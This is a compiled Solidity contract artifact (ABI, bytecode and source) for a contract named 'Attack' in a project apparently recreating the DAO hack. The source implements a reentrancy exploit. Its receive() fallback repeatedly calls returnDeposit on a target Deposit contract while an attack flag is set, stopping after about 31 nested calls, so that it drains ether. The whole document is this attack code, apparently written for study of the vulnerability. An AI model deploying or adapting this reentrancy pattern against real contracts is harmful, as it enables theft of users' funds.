{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_deposit",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "bool",
          "name": "_foo",
          "type": "bool"
        }
      ],
      "name": "executeAttack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amountIn",
          "type": "uint256"
        }
      ],
      "name": "sendDeposit",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "withDraw",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getAttackAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "getDepositAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516104cd3803806104cd8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610439806100946000396000f3fe60806040526004361061004e5760003560e01c806312b0d4001461016657806314174f33146101bd5780633958fe9e146102105780635f52f3ff146102635780639aaa6b4d146102a057610161565b366101615760006101029050601f600154111561008857600060018190555060008060146101000a81548160ff0219169083151502179055505b600060149054906101000a900460ff161561015e57600180600082825401925050819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166318b683fb826040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561012157600080fd5b505af1158015610135573d6000803e3d6000fd5b505050506040513d602081101561014b57600080fd5b8101908080519060200190929190505050505b50005b600080fd5b34801561017257600080fd5b5061017b6102f7565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156101c957600080fd5b506101f6600480360360208110156101e057600080fd5b8101908080359060200190929190505050610320565b604051808215151515815260200191505060405180910390f35b34801561021c57600080fd5b506102496004803603602081101561023357600080fd5b81019080803590602001909291905050506103d7565b604051808215151515815260200191505060405180910390f35b34801561026f57600080fd5b5061029e6004803603602081101561028657600080fd5b810190808035151590602001909291905050506103de565b005b3480156102ac57600080fd5b506102b56103fb565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166318b683fb836040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561039657600080fd5b505af11580156103aa573d6000803e3d6000fd5b505050506040513d60208110156103c057600080fd5b810190808051906020019092919050505050919050565b6000919050565b80600060146101000a81548160ff02191690831515021790555050565b60003090509056fea2646970667358221220688712507b28c5eee68bafa141fa5fb62f7ab1950b60565f9d60eb1384636df864736f6c63430006060033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity >=0.6.6;\n\n/*\ninterface Deposit{\n       function returnDeposit(uint256 amountOut) external returns (bool);\n   }\n   */\n// You either have to define an Interface or use Import to import the code if you have it\nimport \"./deposit.sol\";\n\ncontract Attack{\n    // Need to define a variable of type Deposit\n    Deposit deposit;\n    bool ToraTora;\n    //Global variable mutex to stop recursion\n    uint mutex;\n\n// Now define a constructor function to take the address of the deployed Deposit contract\n    constructor(address payable _deposit) public {\n        deposit = Deposit(_deposit);\n    }\n\n\n\n    function executeAttack (bool _foo) public {\n        ToraTora = _foo;\n    }\n    function sendDeposit (uint256 amountIn) public returns (bool){\n// call deposit contract and deposit some Ether\n    }\n\n    function withDraw(uint amount) public returns (bool){\n        // call deposit contract to withdraw ether\n        deposit.returnDeposit(amount);\n    }\n\n    function getAttackAddress() public view returns (address ){\n        return address(this);\n    }\n\n    function getDepositAddress() public view returns (address ){\n        return address(deposit);\n    }\n\n    receive() external payable {\n        // call back\n        // So if ToraTora is true Attack by calling returnDeposit again\n        // if (mutex check how many times its been called attacker seems to have used 30, check wether to attack, \n        // otherwise any msg to this contract will cause it to attack)\n        uint256 amount = 258;\n        \n        if (mutex > 31){mutex = 0; ToraTora = false;}\n        if (ToraTora) \n        {\n            mutex += 1;\n            // call deposit transfer(_to,amount)\n            deposit.returnDeposit(amount);\n        }\n    \n  }\n    \n}\n",
  "sourcePath": "/Users/Pookie/Documents/Work/DAOHack/contracts/attack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.6+commit.6c089d02.Emscripten.clang"
  },
  "schemaVersion": "3.3.1",
  "updatedAt": "2020-12-15T11:39:49.851Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}